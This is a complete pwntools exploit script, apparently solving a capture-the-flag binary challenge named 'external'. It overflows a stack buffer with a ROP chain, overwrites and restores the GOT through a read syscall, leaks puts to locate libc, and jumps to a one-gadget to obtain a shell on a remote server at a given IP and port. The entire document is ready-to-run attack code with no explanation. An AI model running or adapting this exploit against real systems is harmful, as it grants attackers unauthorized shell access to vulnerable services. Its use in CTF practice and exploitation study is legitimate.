from pwn import *
elf = context.binary = ELF("./external")
libc = ELF("../../libs/libc-2.28.so")

context.log_level = logging.DEBUG
context.terminal = ["tmux", "splitw", "-h"]

def do_local():
	return process(elf.path)

def do_debug():
	return gdb.debug(elf.path, gdbscript = """
												break main
												break *0x40126f
												break *0x401283
""")

def do_remote():
	return remote("161.97.176.150", 9999)

one_shot_offset = 0x448a3
pop_rdi = 0x4012f3
pop_rsi_r15 = 0x4012f1
syscall_ret = 0x401283
got_start = 0x404018
p = do_remote()


payload = p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(got_start) + p64(0) + p64(syscall_ret) +\
p64(elf.sym.main)
payload = 0x58*b"A"+payload
p.recvuntil("> ")
p.send(payload)

#GOT IS: PUTS, SETBUF, PRINTF, MEMSET, ALARM, READ, SIGNAL

input("restore got...")
payload = p64(elf.sym.plt["puts"]+6) + p64(elf.sym.plt["setbuf"]+6) + p64(elf.sym.plt["puts"]+6) +\
p64(elf.sym.plt["puts"]+6) + p64(elf.sym.plt["alarm"]+6) + p64(elf.sym.plt["read"]+6) +\
p64(elf.sym.plt["signal"]+6)
p.sendline(payload)

input("leak libc...")
payload = p64(pop_rdi) + p64(elf.sym.got["puts"]) + p64(elf.sym.plt["puts"]) + p64(elf.sym.main)
p.recvuntil("> \n")
p.sendline(0x58*b"B"+payload)
puts_leak = u64(p.recv(6).ljust(8,b"\x00"))
libc.address = puts_leak - libc.sym.puts
log.info("puts at %x"%puts_leak)
log.info("libc at %x"%libc.address)

input("get shell...")
p.sendline(0x58*b"C" + p64(libc.address + one_shot_offset) + b"\x00"*0x100)
p.interactive()


